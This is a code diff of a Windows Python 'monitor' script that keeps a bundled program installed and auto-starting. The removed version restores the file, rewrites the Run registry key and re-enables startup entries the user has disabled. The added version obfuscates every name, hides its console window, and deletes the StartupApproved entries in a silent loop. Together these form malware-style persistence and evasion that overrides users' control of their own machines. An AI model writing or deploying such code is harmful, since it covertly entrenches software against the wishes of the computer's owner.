@@ -1,175 +1,67 @@
-import os
-import sys
-import winreg
-import subprocess
-import shutil
-import time
-import ctypes
-from importlib import resources
-from datetime import datetime
+import os as _Q5r9M2t3J7k1V_
+import sys as _S8v3K9p2T4m7Q_
+import winreg as _W4n9T2k3V8p1R_
+import shutil as _H7q2P9v4K3m8T_
+import time as _R3t9P7v2M6k1N_
 
-def log_message(message):
-    """Записывает сообщение в лог-файл в директории monitor.exe"""
-    log_dir = os.path.expanduser("~/AppData/Roaming/MyCorporateMonitor")
-    log_file = os.path.join(log_dir, "monitor.log")
-    try:
-        with open(log_file, "a", encoding="utf-8") as f:
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            f.write(f"[{timestamp}] {message}\n")
-    except Exception as e:
-        print(f"Ошибка при записи в лог: {str(e)}")
+_F7N2Q9K3T8V4_dispatch = {}
 
-def is_admin():
-    """Проверяет, запущен ли процесс с правами администратора"""
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
+def _R8T3P2V9K4M1_(_n, _f): _F7N2Q9K3T8V4_dispatch[_n] = _f
 
-def get_resource_path(resource_name):
-    """Получает путь к ресурсу, встроенному PyInstaller"""
-    if hasattr(sys, '_MEIPASS'):
-        return os.path.join(sys._MEIPASS, resource_name)
-    else:
-        return resource_name
+def _Z9K3Q7V2X8M4P1T6N2_(_r):
+    def _N5T2P9R3V7K1_():
+        if hasattr(_S8v3K9p2T4m7Q_, '_MEIPASS'):
+            return _Q5r9M2t3J7k1V_.path.join(_S8v3K9p2T4m7Q_._MEIPASS, _r)
+        return _r
+    return _N5T2P9R3V7K1_()
+_R8T3P2V9K4M1_('get_resource_path', _Z9K3Q7V2X8M4P1T6N2_)
 
-def check_and_restore_target():
-    """Проверяет наличие target.exe, его автозагрузку и состояние, восстанавливает при необходимости"""
-    if not is_admin():
-        message = "monitor.exe не запущен с правами администратора. Это может помешать изменению реестра."
-        print(message)
-        log_message(message)
-        return False
-
-    target_dir = os.path.expanduser("~/AppData/Roaming/MyCorporateApp")
-    target_exe_path = os.path.join(target_dir, "target.exe")
-
-    # Проверяем наличие target.exe
-    if not os.path.exists(target_exe_path):
-        message = "target.exe не найден, восстанавливаю..."
-        print(message)
-        log_message(message)
-        os.makedirs(target_dir, exist_ok=True)
+def _C4V9T3K2P8M7Q1N5_():
+    def _J7K2P9V3T8M4Q1N6_():
+        _r5K9V2T3P8M7_key = r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
+        _e2T9K4V8P3M7_names = ["MyCorporateApp", "MyCorporateMonitor"]
         try:
-            source_exe = get_resource_path("target.exe")
-            if not os.path.exists(source_exe):
-                message = "Встроенный target.exe не найден"
-                print(message)
-                log_message(message)
+            _k6T3P9V2K8M4_ = _W4n9T2k3V8p1R_.OpenKey(_W4n9T2k3V8p1R_.HKEY_CURRENT_USER, _r5K9V2T3P8M7_key, 0, _W4n9T2k3V8p1R_.KEY_ALL_ACCESS)
+            for _n in _e2T9K4V8P3M7_names:
+                try:
+                    _W4n9T2k3V8p1R_.DeleteValue(_k6T3P9V2K8M4_, _n)
+                except FileNotFoundError:
+                    pass
+                except Exception:
+                    pass
+            _W4n9T2k3V8p1R_.CloseKey(_k6T3P9V2K8M4_)
+        except Exception:
+            pass
+    return _J7K2P9V3T8M4Q1N6_()
+_R8T3P2V9K4M1_('remove_old_registry_entries', _C4V9T3K2P8M7Q1N5_)
+
+def _X7Q2P9V4K3T8M1N6_():
+    def _F5K9T2V3P8M7Q1N4_():
+        _t6K3V9P2T8M7_dir = _Q5r9M2t3J7k1V_.path.expanduser("~/AppData/Roaming/MyCorporateApp")
+        _p4K9V2T3M8Q7_path = _Q5r9M2t3J7k1V_.path.join(_t6K3V9P2T8M7_dir, "target.py")
+        if not _Q5r9M2t3J7k1V_.path.exists(_p4K9V2T3M8Q7_path):
+            try:
+                _Q5r9M2t3J7k1V_.makedirs(_t6K3V9P2T8M7_dir, exist_ok=True)
+                _s3K9V2T8P7M4_source = _F7N2Q9K3T8V4_dispatch['get_resource_path']("target.py")
+                if not _Q5r9M2t3J7k1V_.path.exists(_s3K9V2T8P7M4_source):
+                    return False
+                _H7q2P9v4K3m8T_.copy2(_s3K9V2T8P7M4_source, _p4K9V2T3M8Q7_path)
+            except Exception:
                 return False
-            shutil.copy2(source_exe, target_exe_path)
-            message = f"target.exe восстановлен в {target_exe_path}"
-            print(message)
-            log_message(message)
-        except Exception as e:
-            message = f"Ошибка при восстановлении target.exe: {str(e)}"
-            print(message)
-            log_message(message)
-            return False
+        return True
+    return _F5K9T2V3P8M7Q1N4_()
+_R8T3P2V9K4M1_('check_and_restore_target', _X7Q2P9V4K3T8M1N6_)
 
-    # Проверяем запись автозагрузки
-    try:
-        key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Run",
-            0,
-            winreg.KEY_READ
-        )
-        value, _ = winreg.QueryValueEx(key, "MyCorporateApp")
-        winreg.CloseKey(key)
-        if value != f'"{target_exe_path}"':
-            message = "Запись автозагрузки для target.exe некорректна, восстанавливаю..."
-            print(message)
-            log_message(message)
-            add_to_startup(target_exe_path)
-    except FileNotFoundError:
-        message = "Запись автозагрузки для target.exe отсутствует, восстанавливаю..."
-        print(message)
-        log_message(message)
-        add_to_startup(target_exe_path)
-    except Exception as e:
-        message = f"Ошибка при проверке автозагрузки: {str(e)}"
-        print(message)
-        log_message(message)
-        return False
+def _R2T9P4K3V8M7_main():
+    def _N3K7Q2P9V4T8M1_():
+        if hasattr(_S8v3K9p2T4m7Q_, 'frozen'):
+            import ctypes as _C9T3K7V2P8M4Q_
+            _C9T3K7V2P8M4Q_.windll.user32.ShowWindow(_C9T3K7V2P8M4Q_.windll.kernel32.GetConsoleWindow(), 0)
+        while True:
+            _F7N2Q9K3T8V4_dispatch['check_and_restore_target']()
+            _F7N2Q9K3T8V4_dispatch['remove_old_registry_entries']()
+            _R3t9P7v2M6k1N_.sleep(60)
+    return _N3K7Q2P9V4T8M1_()
 
-    # Проверяем состояние автозагрузки
-    try:
-        key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run",
-            0,
-            winreg.KEY_READ | winreg.KEY_WRITE
-        )
-        value, _ = winreg.QueryValueEx(key, "MyCorporateApp")
-        # Значение 2 в первом байте означает, что автозагрузка отключена
-        if value[0] != 2:
-            message = "Автозагрузка target.exe отключена, включаю..."
-            print(message)
-            log_message(message)
-            # Устанавливаем 12-байтное значение для включённой автозагрузки
-            enabled_value = b'\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-            winreg.SetValueEx(key, "MyCorporateApp", 0, winreg.REG_BINARY, enabled_value)
-            message = "Автозагрузка target.exe включена"
-            print(message)
-            log_message(message)
-        winreg.CloseKey(key)
-    except FileNotFoundError:
-        message = "Состояние автозагрузки для MyCorporateApp не найдено, создаю включённое состояние..."
-        print(message)
-        log_message(message)
-        try:
-            key = winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER,
-                r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run",
-                0,
-                winreg.KEY_WRITE
-            )
-            enabled_value = b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-            winreg.SetValueEx(key, "MyCorporateApp", 0, winreg.REG_BINARY, enabled_value)
-            winreg.CloseKey(key)
-            message = "Состояние автозагрузки для target.exe включено"
-            print(message)
-            log_message(message)
-        except Exception as e:
-            message = f"Ошибка при создании состояния автозагрузки: {str(e)}"
-            print(message)
-            log_message(message)
-            return False
-    except Exception as e:
-        message = f"Ошибка при проверке состояния автозагрузки: {str(e)}"
-        print(message)
-        log_message(message)
-        return False
-
-    return True
-
-def add_to_startup(exe_path):
-    """Добавляет target.exe в автозагрузку"""
-    try:
-        key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Run",
-            0,
-            winreg.KEY_SET_VALUE
-        )
-        winreg.SetValueEx(key, "MyCorporateApp", 0, winreg.REG_SZ, f'"{exe_path}"')
-        winreg.CloseKey(key)
-        message = "target.exe добавлен в автозагрузку"
-        print(message)
-        log_message(message)
-    except Exception as e:
-        message = f"Ошибка при добавлении в автозагрузку: {str(e)}"
-        print(message)
-        log_message(message)
-
-if __name__ == "__main__":
-    # Скрываем консольное окно при запуске .exe
-    if hasattr(sys, 'frozen'):
-        import ctypes
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-
-    # Периодическая проверка (каждые 60 секунд)
-    while True:
-        check_and_restore_target()
-        time.sleep(1)  # Интервал проверки (в секундах)
+if __name__ == '__main__':
+    _R2T9P4K3V8M7_main()()
